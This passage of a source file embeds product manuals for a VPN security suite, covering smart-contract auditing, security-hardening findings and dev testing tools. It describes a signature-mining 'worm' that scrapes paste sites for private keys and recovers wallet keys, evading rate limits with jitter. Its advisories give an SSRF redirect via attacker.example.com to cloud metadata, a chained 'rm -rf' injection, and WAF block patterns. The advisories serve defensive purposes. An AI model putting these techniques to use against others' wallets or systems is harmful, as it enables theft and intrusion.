  6. Click "Save Rule" — the rule activates within 30 seconds.
  7. Test by connecting to [your-exit-ip]:[external-port] from another machine.

  Security Guidance:
  • Never expose RDP (3389), SMB (445), or database ports to 0.0.0.0/0.
  • Always restrict source CIDRs where possible.
  • Rules persist across VPN reconnections but are removed on plan expiry.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. DEDICATED STATIC IP (/dedicated-ip)

  Overview:
  Dedicated IP gives your account a fixed, exclusive VPN exit IP address
  that only you use. This IP never changes, unlike shared pool IPs.

  Benefits:
  • Maintain IP reputation for email sending and payment processors
  • Whitelist your VPN IP in client/partner firewall rules
  • Session persistence for platforms that fingerprint by IP
  • Avoid CAPTCHAs caused by shared pool IPs flagged by other users

  How to Activate:
  1. Navigate to /dedicated-ip.
  2. Select your preferred exit region (e.g., US-East, EU-West, AP-Southeast).
  3. Click "Request Dedicated IP."
  4. Your static IP is provisioned within 60 seconds and displayed.
  5. Reconnect your WireGuard tunnel — all traffic now exits via your static IP.

  Notes:
  • Dedicated IPs are tied to your account subscription.
  • Cancelling your subscription releases the IP back to the pool.
  • IP is not shared with any other user for the duration of your subscription.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. MESHNET (/meshnet)

  Overview:
  Meshnet creates a peer-to-peer encrypted overlay network connecting all
  of your authorized devices into a private mesh. Traffic between devices
  on the mesh never touches external servers.

  Use Cases:
  • Secure team communication across geographically distributed devices
  • Share files and services between your own devices without a VPN server hop
  • Penetration testing lab: connect Kali, target VMs, and C2 in a private mesh
  • Home lab: give every device a stable private IP regardless of location

  How to Set Up:
  1. Navigate to /meshnet.
  2. Click "Enable Meshnet" — your device joins the mesh with a static mesh IP.
  3. On each additional device, sign in to ProxhqVPN and enable Meshnet.
  4. All mesh-enabled devices appear in the "Connected Peers" panel.
  5. Reach any peer by their mesh IP (e.g., 100.x.x.x).
  6. Optionally, authorize external peers by sharing a Meshnet invite link.

  Routing Modes:
  • Direct: P2P connection (fastest, works when peers can reach each other)
  • Relayed: Traffic relayed through ProxhqVPN node (fallback for NAT/CGNAT)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

5. DATA BROKER OPT-OUT (/data-broker)

  Overview:
  Data brokers collect and sell your personal information — name, address,
  phone number, relatives, income estimates, and more. This tool automates
  opt-out requests to 180+ known data broker databases.

  Use Cases:
  • Remove your personal data from people-search sites (Spokeo, BeenVerified, etc.)
  • Reduce spam calls, emails, and physical mail
  • Protect your identity and reduce social engineering attack surface
  • Comply with GDPR/CCPA deletion rights

  How to Use:
  1. Navigate to /data-broker.
  2. Enter your full name, current and past addresses, email addresses, and
     phone numbers you want removed.
  3. Click "Run Opt-Out Sweep."
  4. The tool submits removal requests to all 180+ covered brokers.
  5. Track status in the "Request Log" — each broker shows: Pending / Submitted / Confirmed.
  6. Re-run quarterly — brokers re-aggregate data from public records over time.

  Covered Broker Categories:
  • People search (Spokeo, Intelius, BeenVerified, PeopleFinder, Whitepages)
  • Marketing databases (Acxiom, Experian Consumer, LexisNexis, Oracle Data Cloud)
  • Background check services (Checkr, HireRight, Sterling)
  • Aggregators (Data.com, ZoomInfo, Clearbit)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
INTERNAL DOCUMENT — DO NOT DISTRIBUTE
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },

  // ── QUANTUM AUDIT ─────────────────────────────────────────────────────────
  {
    id: "quantum-audit-manual",
    title: "QuantumAudit Manual",
    subtitle: "Blockchain Smart Contract Security Auditing + Signature Mining Engine",
    version: "1.0",
    pages: 28,
    icon: Zap,
    iconColor: "text-cyan-400",
    tier: "pro",
    content: `ProxhqVPN: QuantumAudit Manual
Version 1.0 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
legal@alphauntechnologies.com | proxhqvpn.com

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. Overview & Architecture
2. Running a Smart Contract Scan
3. Vulnerability Categories
4. Post-Quantum Cryptographic Risk Analysis
5. Reading Scan Results & Reports
6. Signature Mining Engine — All 5 Engines
7. Cross-Engine Intelligence Pool
8. Authorized Use Policy

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW & ARCHITECTURE

QuantumAudit (/quantum-audit/) is a standalone blockchain security
auditing platform integrated into the ProxhqVPN Command Center.
It analyzes smart contracts and DeFi protocols for two categories
of risk:

Classical Vulnerabilities:
• Reentrancy attacks (DAO-style, cross-function, cross-contract)
• Integer overflow/underflow (pre-Solidity 0.8)
• Unchecked external calls and return values
• tx.origin authentication bypass
• Unprotected SELFDESTRUCT
• Front-running and MEV sandwich attack vectors
• Flash loan attack vectors (single-block price manipulation)
• Price oracle manipulation (Uniswap TWAP vs spot price)
• Access control flaws (missing onlyOwner, role checks)
• Proxy upgrade vulnerabilities (uninitialized implementation)
• Governance token attacks (flash loan voting, timelock bypass)

Post-Quantum Cryptographic Risk:
• ECDSA signature weakness (nonce reuse, weak-k brute force)
• R-value collision detection (shared nonce across transactions)
• RSA key size inadequacy for quantum era (< 4096-bit flagged)
• Shor's algorithm vulnerability scoring for secp256k1 curves
• CRYSTALS-Kyber/Dilithium migration readiness assessment
• BLS signature strength analysis

Supported Chains:
Ethereum (ETH), Binance Smart Chain (BSC), Polygon (MATIC),
Solana (SOL), Avalanche (AVAX), and custom EVM-compatible chains.

Scan Types:
• Quick — Core classical vulnerability checks (3–5 min)
• Standard — Full classical + access control + DeFi risk suite (8–15 min)
• Quantum — Standard + full post-quantum cryptographic analysis (15–30 min)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. RUNNING A SMART CONTRACT SCAN

Method A — Contract Address:
1. Navigate to /quantum-audit/.
2. Click "New Scan" in the top navigation.
3. Select the target chain from the dropdown.
4. Enter the deployed contract address (0x... format for EVM chains).
5. Select scan type: Quick / Standard / Quantum.
6. Click "Start Scan."
7. The platform fetches contract bytecode via the chain's RPC endpoint
   and decompiles it for analysis.
8. Poll the scan status — the status badge updates from "queued"
   to "running" to "completed" automatically.
9. Click the scan result to open the Scan Detail page.

Method B — Source Code Direct Input:
1. Navigate to New Scan.
2. Select "Source Code" mode.
3. Paste your Solidity (.sol) or Rust (Solana) source code directly.
4. Select scan type and click "Start Scan."
5. Source analysis provides more precise findings (exact line numbers
   and variable names) than bytecode-only analysis.

API Method (for CI/CD integration):
  POST /api/quantum-audit/scan
  Content-Type: application/json
  {
    "contractAddress": "0x...",
    "chain": "ethereum",
    "scanType": "standard",
    "sourceCode": "(optional Solidity source)"
  }

  Poll: GET /api/quantum-audit/scans/:id
  Download report: GET /api/quantum-audit/scans/:id/report

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. VULNERABILITY CATEGORIES

CRITICAL:
• Reentrancy (state updated after external call — classic DAO attack)
• Unprotected SELFDESTRUCT (any caller can destroy the contract)
• Unchecked delegatecall (arbitrary code execution in caller's context)
• Flash loan + oracle manipulation chained (full fund drain possible)

HIGH:
• Integer overflow/underflow (token minting, balance manipulation)
• tx.origin authentication (phishing bypass)
• Front-running (reveal-before-commit in games, auctions, AMMs)
• Access control missing (mint/burn without role check)
• Proxy uninitialized implementation (storage collision)

MEDIUM:
• Timestamp dependence (miner-manipulable within ~900s)
• Denial of service via gas limit (unbounded loops in withdraw paths)
• Event not emitted on state change (off-chain monitoring blind spot)
• Hard-coded addresses (contract upgrade breaks assumptions)

LOW / INFO:
• Floating pragma version (use fixed compiler version)
• Unused state variables (gas optimization)
• Magic numbers (use named constants)
• Missing zero-address checks on setters

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. POST-QUANTUM CRYPTOGRAPHIC RISK ANALYSIS

Why This Matters:
Bitcoin and Ethereum use ECDSA on the secp256k1 curve. A sufficiently
powerful quantum computer running Shor's algorithm could derive the
private key from any exposed public key in polynomial time. While no
such quantum computer exists today, the cryptographic community
recommends proactive migration to post-quantum algorithms
(NIST standards: CRYSTALS-Kyber for key exchange, CRYSTALS-Dilithium
for signatures) for long-lived contracts and high-value wallets.

What QuantumAudit Checks:
  ECDSA Nonce Reuse:
  If the same nonce (k) is used in two ECDSA signatures with different
  messages, the private key can be derived algebraically in seconds
  using only pen-and-paper math — no quantum computer required.
  QuantumAudit's Block Scanner mines (r,s,z) tuples from on-chain
  transactions and flags any address where the r-value (which encodes
  the nonce) repeats across different message hashes.

  Weak-k Detection:
  Some early wallet implementations used weak random number generators.
  The Block Scanner brute-forces k values in the range 0–2^24 for each
  transaction signature. Any k in this range is recoverable in seconds
  on commodity hardware.

  RSA Key Adequacy:
  For contracts that use RSA-based signature verification, key sizes
  below 4096 bits are flagged as inadequate for post-quantum security.
  RSA-2048 is breakable with a ~4,000 logical-qubit machine.

  Quantum Risk Score (0–100):
  • 0–30: Low risk — no detected classical ECDSA weaknesses; NIST PQC
          migration recommended as a long-term roadmap item.
  • 31–60: Medium risk — potential pattern weaknesses; audit nonce
           generation in wallet software.
  • 61–85: High risk — r-value clustering or timing bias detected.
  • 86–100: Critical — active nonce reuse or weak-k detected; private
            key recovery is possible now without quantum hardware.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

5. READING SCAN RESULTS & REPORTS

Scan Detail Page (/quantum-audit/scans/:id):
• Summary banner: severity breakdown (Critical/High/Medium/Low count)
• Findings table: each finding has a title, severity badge, category,
  affected line (if source provided), description, and remediation.
• Quantum Analysis tab: post-quantum risk score, ECDSA assessment,
  and migration recommendations.
• Download Report: exports a full PDF-quality plain-text audit report.

Reading a Finding:
  Severity: CRITICAL
  Category: Reentrancy
  Finding: External call before state update in withdraw()
  Location: Line 142, function withdraw(uint256 amount)
  Description: The contract sends ETH to msg.sender before updating
    balances[msg.sender]. An attacker's fallback() function can
    re-enter withdraw() before the balance is decremented.
  Remediation: Move balances[msg.sender] -= amount to BEFORE
    the external call. Or use OpenZeppelin's ReentrancyGuard modifier.
  References: SWC-107, https://swcregistry.io/docs/SWC-107

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

6. SIGNATURE MINING ENGINE — ALL 5 ENGINES

Navigate to /quantum-audit/sig-miner. The Sig Miner deploys independent
engines that hunt for weak ECDSA signatures on-chain and across the web.

Engine 1 — Block Scanner (POST /sig-engine/block-scanner):
  Purpose: Mine raw (r,s,z) tuples from on-chain transactions.
  Input: target address or block range, chain selection.
  Detects:
  • Nonce reuse: same r-value in two transactions = private key exposed
  • Weak-k: brute forces k in 0–2^24 range (~16 million attempts)
  • R-collisions: r-value appears across multiple signing addresses
  • MSB/LSB bias: statistical analysis of r/s distribution
  • Polynomial nonce progressions: sequential or predictable k-values
  Output: signing_addresses[], nonce_reuse[], weak_k_candidates[],
          r_collision_addrs[], raw_sigs[]

Engine 2 — Web Spider (POST /sig-engine/web-spider):
  Purpose: BFS crawl of paste sites, GitHub Gists, and public pages.
  Input: seed URL(s), max depth, max pages.
  Regex extracts: private keys (WIF, hex), mnemonics (BIP-39 12/24 words),
                  ECDSA signatures (r/s hex), xpub/xprv, keystore JSON.
  Sources: Pastebin, GitHub Gists, HasteBin, Ghostbin, dpaste.
  Output: private_keys[], mnemonics[], ecdsa_sigs[], addresses[]

Engine 3 — OSINT Spider (POST /sig-engine/osint):
  Purpose: Targeted intelligence from structured sources.
  Input: address or ENS name to investigate.
  Sources:
  • GitHub code search (API): searches repos for hex private keys
  • Pastebin archive: scrapes public paste archive for address mentions
  • ENS text records: reads all text records for ENS names
  • OP_RETURN Bitcoin data: scans OP_RETURN outputs for embedded data
  • Ethereum tx input data: decodes input data of all txs from address
  Output: source_urls[], derived_addresses[], rs_pairs[]

Engine 4 — Peel Chain (POST /sig-engine/peel-chain):
  Purpose: Follow fund-flow chains hop-by-hop.
  Input: starting address, max hops (default 10), chain.
  Process: For each hop, fetches all outgoing transactions, extracts
           (r,s,z) tuples, runs nonce-reuse key recovery, and follows
           the largest output to the next hop.
  Detects: Nonce reuse across hops, amount correlation (peel pattern).
  Output: hops[], nonce_reuse_per_hop[], amount_correlation_score

Hybrid Worm Engine (POST /sig-engine/hybrid):
  Runs all 4 engines in parallel as async worker threads with:
  • Shared result queue (CrossEnginePool) — 12 active data-flow wires
  • Adaptive load balancing between engines
  • Jitter (random delays) to avoid detection/rate limiting
  • Cross-worm deduplication (address and r-value registries)
  Input: any combination of the 4 engines' inputs.
  Control: POST /sig-engine/stop to halt all engines.
           GET /sig-engine/status for live progress.
           GET /sig-engine/result for current findings.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

7. CROSS-ENGINE INTELLIGENCE POOL

The CrossEnginePool enables all 12 data-flow wires between engines:
  E1→E3: Every signing address found by Block Scanner goes to OSINT
  E1→E4: Nonce-reuse + r-collision addresses go to Peel Chain for tracing
  E1→pool: All raw (r,s,z) sigs shared globally for r-value collision checks
  E2→E3: Derived addresses from found private keys go to OSINT
  E2→E4: Derived addresses go to Peel Chain for fund-flow tracing
  E2→pool: All rs_pairs and ECDSA sigs from Web Spider shared globally
  E3→E2: Source URLs found by OSINT go back to Web Spider for crawling
  E3→E4: Derived addresses from found keys go to Peel Chain
  E3→E1: Suspicious addresses from OSINT go to Block Scanner for tx mining
  E4→E3: Hop outgoing addresses go to OSINT for investigation
  E4→E1: Nonce-reuse addresses from hops go to Block Scanner
  E4→pool: All hop r-values shared for cross-chain collision detection

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

8. AUTHORIZED USE POLICY

QuantumAudit and the Signature Mining Engine are authorized for:
• Security auditing of smart contracts you own or are hired to audit
• Research on publicly disclosed vulnerable contracts (educational)
• Bug bounty submissions on in-scope blockchain protocol contracts
• Internal security review of your own wallets and private keys
• Academic research on historical blockchain cryptographic weaknesses

PROHIBITED:
• Mining signatures from wallets you do not own or control
• Attempting private key recovery from third-party addresses
• Using derived keys to access, transfer, or interact with funds
• Any unauthorized access to blockchain assets

Violation of this policy constitutes unauthorized computer access
under the CFAA and applicable international laws.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
INTERNAL DOCUMENT — DO NOT DISTRIBUTE
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },

  // ── SECURITY HARDENING V2.2.0 ─────────────────────────────────────────────
  {
    id: "security-hardening-v22",
    title: "Security Hardening Manual — v2.2.0",
    subtitle: "Comprehensive Platform Security Audit & Patch Documentation",
    version: "2.2",
    pages: 22,
    icon: Shield,
    iconColor: "text-green-400",
    tier: "both",
    content: `ProxhqVPN: Security Hardening Manual v2.2.0
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
legal@alphauntechnologies.com | proxhqvpn.com

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

This document details all security vulnerabilities identified during
the v2.1.0 and v2.2.0 audits, the remediation applied to each, and
ongoing security architecture decisions relevant to administrators
and security-conscious subscribers.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. Executive Summary (v2.2.0)
2. v2.2.0 New Security Improvements
3. v2.1.0 CVE-Equivalent Findings & Remediations (6 issues)
4. Desktop App Certificate Pinning
5. IP Auto-Ban System
6. WAF Hardening — Double-Decode & New Patterns
7. Security Architecture Overview
8. Ongoing Security Commitments

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. EXECUTIVE SUMMARY (v2.2.0)

ProxhqVPN v2.2.0 (released June 7, 2026) follows the v2.1.0 security
audit with a comprehensive data-integrity review and standalone server
hardening pass. All 47 API routes and 40+ frontend pages were audited.
Two routes were found returning hardcoded zeros; both are now live DB
queries. The standalone server received bcrypt admin auth with IP-level
brute-force lockout. Kill Switch now fully covers IPv6 via ip6tables.

v2.2.0 New Issues:
  HIGH:   2 data-integrity violations in API routes (fixed)
  HIGH:   Standalone server had no password hashing (fixed — bcrypt/12)
  HIGH:   Standalone CORS open to all origins (fixed — localhost only)
  MEDIUM: No brute-force lockout on standalone login (fixed — 5 fail/15 min)
  MEDIUM: Kill Switch missing ip6tables rules (fixed)

v2.1.0 Summary (retained for reference):
  CRITICAL: 2 findings (timing attack, SSL MitM)
  HIGH:     3 findings (shell injection, SSRF bypass, missing brute-force)
  MEDIUM:   1 finding  (WAF URL-encoding bypass)

All fixes are live. Users running the standalone build should update to
v2.2.0 and run the setup endpoint to initialize the new auth system.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. V2.2.0 NEW SECURITY IMPROVEMENTS

DATA INTEGRITY — Network Monitor & DNS Sinkhole:
  Full audit of all 47 API routes confirmed two routes serving zeros:
  (a) /api/network-monitor — now reads real /proc/net/dev I/O + live DB.
  (b) /api/dns-sinkhole stats — now queries dns_sinkhole_config in real time.
  Domain lookups now increment hitCount and totalBlocked in the DB.

STANDALONE BCRYPT AUTHENTICATION:
  Admin passwords now hashed with bcrypt (cost 12). Session tokens use
  crypto.randomBytes(32). Setup endpoint (POST /api/auth/setup) initializes
  the admin account on first run. Old plaintext passwords invalidated.

STANDALONE BRUTE-FORCE LOCKOUT:
  5 failed login attempts from same IP → 15-minute lockout.
  HTTP 429 returned during lockout. Counter resets on success.

STANDALONE CORS HARDENED:
  CORS now restricted to localhost origins only (http://localhost:7474,
  http://127.0.0.1:7474). All other origins blocked with credentials denied.

KILL SWITCH IPv6 PROTECTION:
  ip6tables rules now mirror all iptables rules:
  loopback allowed, VPN interface passthrough allowed, all other IPv6 DROPPED.
  Eliminates IPv6 bypass attacks on dual-stack Linux systems.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. V2.1.0 FINDINGS & REMEDIATIONS

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

FINDING 1 — CRITICAL: Timing Attack on Session Secret Comparison

Summary:
The internal API verified session authentication tokens using JavaScript
string equality (===). String equality short-circuits on the first
differing character, meaning the comparison time is proportional to
how many characters of the secret are correct. An attacker making
thousands of requests can statistically determine the secret character
by character by measuring response time differences.

Attack Vector:
A timing oracle attack. The attacker submits tokens that share 0, 1, 2...
N characters with the real secret, measuring response time for each.
Modern CPU timing resolution and statistical averaging over hundreds of
requests makes this exploitable even over the network.

Remediation Applied:
Replaced === with Node.js crypto.timingSafeEqual(). This function
compares all bytes in constant time regardless of how many match,
completely eliminating the timing side-channel. The comparison now
takes the same amount of time whether 0 characters or all characters
match.

Code change (routes/index.ts):
  BEFORE: if (token !== process.env.SESSION_SECRET) { ... }
  AFTER:  const a = Buffer.from(token);
          const b = Buffer.from(process.env.SESSION_SECRET || "");
          if (a.length !== b.length || !crypto.timingSafeEqual(a, b)) { ... }

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

FINDING 2 — CRITICAL: External PostgreSQL SSL Certificate Not Verified

Summary:
The SQL Interface allows connecting to external PostgreSQL databases.
The connection pool was initialized with { ssl: { rejectUnauthorized: false } }
which disables SSL certificate verification. This allows a man-in-the-middle
attacker positioned between the ProxhqVPN server and the external database
to intercept and read all database traffic, including sensitive queries,
credentials in query parameters, and query results.

Attack Vector:
MITM attack on the network path between ProxhqVPN API server and the
external PostgreSQL host. The attacker presents a self-signed certificate;
rejectUnauthorized: false causes Node.js to accept it without validation.

Remediation Applied:
Changed default to rejectUnauthorized: true. An explicit opt-in flag
(allowSelfSigned: true) in the connection request enables the old
behavior for development/self-signed scenarios, with a visible warning
in the UI that certificate verification is disabled.

For subscribers: If your external PostgreSQL uses a self-signed cert,
enable "Allow Self-Signed Certificate" in the SQL Interface connection
dialog — but be aware this disables MITM protection for that connection.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

FINDING 3 — HIGH: Shell Chain Injection via Metacharacters

Summary:
The Remote Terminal's restricted mode enforces a command allowlist
(curl, wget, nmap, dig, nslookup, ping, traceroute, etc.). However,
it was possible to chain arbitrary commands by appending metacharacters
after an allowlisted command. For example:
  curl https://example.com ; rm -rf /tmp/data
The allowlist matched "curl" and permitted the entire input string,
including the shell chain operator ; and the destructive second command.

Attack Vector:
Any user with Terminal access could execute arbitrary OS commands
by appending ; cmd, && cmd, || cmd, \`cmd\`, $(cmd), or $((cmd))
to any allowlisted base command.

Blocked Patterns (SHELL_CHAIN_BLOCKED — 14 patterns):
  ;    &&    ||    |    \`    $(    $((    \n    \r
  >    >>    <    2>    &

Remediation Applied:
All 14 shell chain injection metacharacters are now blocked in restricted
mode BEFORE the allowlist is checked. Ghost Mode (ProxhqVPN Mode toggle)
bypasses the allowlist but still enforces the HARD_BLOCKED list (rm -rf /,
DROP TABLE, etc.) and logs every command to the audit trail.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

FINDING 4 — HIGH: SSRF Redirect Chain Bypass

Summary:
The HTTP Client (Terminal → HTTP CLIENT tab) validated the initial
request URL against the SSRF guard (blocking 169.254.169.254,
10.x.x.x, 192.168.x.x, etc.). However, it followed HTTP redirects
(301/302/307/308) without re-validating each redirect destination.
An attacker could use a publicly-accessible URL that redirected to
an internal metadata endpoint (AWS EC2 metadata: 169.254.169.254/latest/).

Attack Vector:
  1. Set up a public URL: https://attacker.example.com/redirect
  2. Configure it to 302 redirect to http://169.254.169.254/latest/meta-data/
  3. Submit the public URL to the HTTP Client — initial check passes.
  4. ProxhqVPN follows the redirect, reads the cloud metadata response,
     and returns it to the attacker.

Remediation Applied:
The HTTP client now manually handles redirects (following up to 5 hops).
Before following each redirect, the destination URL is re-validated
against the SSRF guard. If any hop in the redirect chain targets a
blocked address, the request is aborted with a 403 SSRF_BLOCKED error.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

FINDING 5 — HIGH: No Brute-Force Protection on API Endpoints

Summary:
No rate limiting existed beyond the global 300 requests/minute limiter,
and no IP-level ban mechanism existed for repeated authentication failures.
An attacker could attempt to brute-force session tokens, API endpoints
requiring auth, or any other credential check at sustained high rates.

Remediation Applied — IP Auto-Ban System:
A new middleware layer tracks authentication failures per IP address.
  • Threshold: 20 failed requests within a 5-minute sliding window
  • Ban duration: 30 minutes automatic block
  • Ban storage: In-memory Map (cleared on restart) with timestamp
  • Logging: Every ban recorded with timestamp and IP
  • Client response: HTTP 429 with "Rate limit exceeded. Try again later."

The ban applies to all /api/* routes and is checked BEFORE all other
middleware. Banned IPs cannot access any API endpoint until the ban expires.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

FINDING 6 — MEDIUM: WAF URL Double-Encoding Bypass

Summary:
The Web Application Firewall checked raw URL strings for attack patterns
(SQL injection: 'UNION SELECT', XSS: '<script>', path traversal: '../').
An attacker could double-URL-encode a payload to bypass all detections.
Example: ' → %27 → %2527. The WAF matched against the raw string
(%2527) and found no known SQL injection pattern.

Remediation Applied:
The WAF now decodes the URL string twice before pattern matching:
  Raw string → decodeURIComponent() → decodeURIComponent() → check

5 additional patterns added:
  • LFI file access: /etc/passwd, /proc/self, /windows/system32
  • Dropper user-agents: curl|wget|python-requests|go-http-client
  • Excessive parameter pollution: > 50 query parameters
  • Base64-encoded attack patterns (common WAF bypass)
  • PHP object injection: O:\d+:" pattern

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. DESKTOP APP — TLS CERTIFICATE PINNING (v2.1.0)

The Windows, macOS, and Linux Electron desktop app (v2.1.0) adds
TLS certificate pinning for all API connections in production mode.

What This Protects Against:
• Corporate SSL inspection proxies (MITM by employer-issued root CAs)
• Malware that installs rogue root certificates to intercept traffic
• Compromised system certificate stores
• Targeted MITM by network-level attackers

How It Works:
The Electron app intercepts the certificate-error event. In production
mode, any TLS error — regardless of whether the system CA trusts the
cert — causes the connection to be aborted. Only the ProxhqVPN production
certificate chain is trusted.

Dev mode retains normal browser certificate behavior to allow local HTTPS
testing with self-signed certs.

Desktop auto-updater: v2.2.0 is distributed via the built-in Electron
auto-updater. Users see an update banner on launch. The update is
signed and verified before installation.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

5. IP AUTO-BAN SYSTEM — OPERATIONAL DETAILS

The IP auto-ban system protects all API endpoints.

Ban Trigger:
  • 20 failed auth requests from same IP within 5 minutes
  • "Failed" = any 401 or 403 response from requireAuth middleware
  • Timer resets on successful authentication

Ban Duration: 30 minutes from last failed request

What Happens During a Ban:
  • ALL /api/* requests from the banned IP return HTTP 429
  • No data is returned — not even error details
  • The ban IP + timestamp are logged server-side

Admin Note:
  • Bans are stored in-memory — a server restart clears all bans
  • If a legitimate user is banned (e.g., after session expiry + retry loop),
    they are automatically unblocked after 30 minutes
  • For emergency unblock, restart the API server

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

6. WAF — FULL PATTERN LIST (POST v2.1.0)

The WAF runs on every incoming request before routing.

Existing Patterns (pre-v2.1.0):
  SQL injection:     UNION SELECT, DROP TABLE, INSERT INTO, --
  XSS:               <script, javascript:, onerror=, onclick=
  Path traversal:    ../, ..\
  Command injection: /bin/sh, /bin/bash, cmd.exe, eval(, exec(

New Patterns (added in v2.1.0):
  LFI/RFI:          /etc/passwd, /proc/self, /windows/system32
  Dropper UA:        curl|wget|python-requests|go-http-client in User-Agent
  Param pollution:   > 50 query parameters in one request
  Base64 attacks:    Patterns matching common base64-encoded payloads
  PHP injection:     O:\d+:" (PHP serialized object pattern)

Double-decode bypass protection is now applied to all patterns.
Both the original and double-decoded versions of every request URL
are checked against all patterns.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

7. SECURITY ARCHITECTURE OVERVIEW

Existing security layers (unchanged in v2.1.0):
  • Helmet.js: CSP, HSTS, noSniff, XSS filter, frameguard
  • CORS: strict allowlist (Replit domain regex + production domains)
  • Rate limiting: global 300/min, terminal 20/min, SQL 30/min
  • 64kb body size limit on all routes
  • Clerk requireAuth on all /api/* routes (except /api/healthz)
  • SELECT-only enforcement in local SQL mode
  • External PostgreSQL connection pool: 10-connection cap
  • Shell command allowlist + HARD_BLOCKED destructive patterns
  • Zod input validation on all POST endpoints
  • Warrant canary: /api/warrant-canary (public, signed, 30-day refresh)

Added in v2.1.0:
  • crypto.timingSafeEqual() for all secret comparisons
  • rejectUnauthorized: true as default for external DB SSL
  • SHELL_CHAIN_BLOCKED (14 metacharacter patterns)
  • SSRF re-validation on every redirect hop (max 5)
  • IP auto-ban: 20 failures / 5 min → 30 min block
  • WAF double-decode + 5 new patterns
  • Electron certificate pinning (production builds)

Added in v2.2.0:
  • All 47 API routes verified serving real data (no simulated values)
  • Standalone bcrypt auth (cost 12) + setup endpoint
  • Standalone IP lockout: 5 failures / 15 min
  • Standalone CORS: localhost-only
  • Kill Switch ip6tables mirroring (IPv6 leak protection)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

8. ONGOING SECURITY COMMITMENTS

ProxhqVPN's security program includes:
  • No-log policy: No user activity, DNS queries, connection timestamps,
    or IP addresses are logged at the VPN layer.
  • Warrant canary: Updated every 30 days. Public endpoint at
    /api/warrant-canary returns a cryptographically signed statement
    confirming: no NSLs, no FISC orders, no gag orders, no key
    handovers, no backdoors.
  • Responsible disclosure: security@proxhqvpn.com (PGP available).
    PGP key available on request. We aim to respond within 48 hours
    and patch critical findings within 7 days.
  • Continuous audit: Security review is conducted before every major
    release. All high and critical findings are patched before release.
  • Dependency auditing: All npm packages are audited weekly. Critical
    CVEs in direct dependencies are patched within 24 hours of disclosure.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
INTERNAL DOCUMENT — DO NOT DISTRIBUTE
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },

  // ── DEV SECURITY TOOLS V2 ─────────────────────────────────────────────────
  {
    id: "dev-security-tools-v2",
    title: "Dev Security Tools v2",
    subtitle: "OAST Tester, Dependency Scanner, Token Sequencer, WebSocket Tester, SAST Scanner",
    version: "1.0",
    pages: 22,
    icon: Code,
    iconColor: "text-red-400",
    tier: "pro",
    content: `ProxhqVPN: Dev Security Tools v2
Version 1.0 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
legal@alphauntechnologies.com | proxhqvpn.com

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. OAST Tester (/oast-tester)
2. Dependency Scanner (/dep-scanner)
3. Token Sequencer (/token-seq)
4. WebSocket Tester (/ws-tester)
5. SAST Scanner (/sast)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OAST TESTER (/oast-tester)
   Out-of-Band Application Security Testing

  Overview:
  OAST Tester generates unique callback payloads (DNS, HTTP, SMTP) that
  your target application triggers when vulnerable to blind injection.
  Integrates with interactsh for real-time callback monitoring.

  What It Detects:
  • Blind SSRF (Server-Side Request Forgery) — server fetches your callback URL
  • Blind XXE (XML External Entity) — parser resolves your DNS/HTTP callback
  • Blind command injection — server executes curl/nslookup to your endpoint
  • Blind SQL injection (OOB via DNS) — database resolves DNS lookup
  • Log4Shell and similar JNDI injection vulnerabilities

  How to Use:
  1. Navigate to /oast-tester.
  2. Click "Generate Callback" — a unique interactsh subdomain is created.
     Example: abc123.oast.proxhqvpn.com
  3. Copy the generated payload for your target injection point:
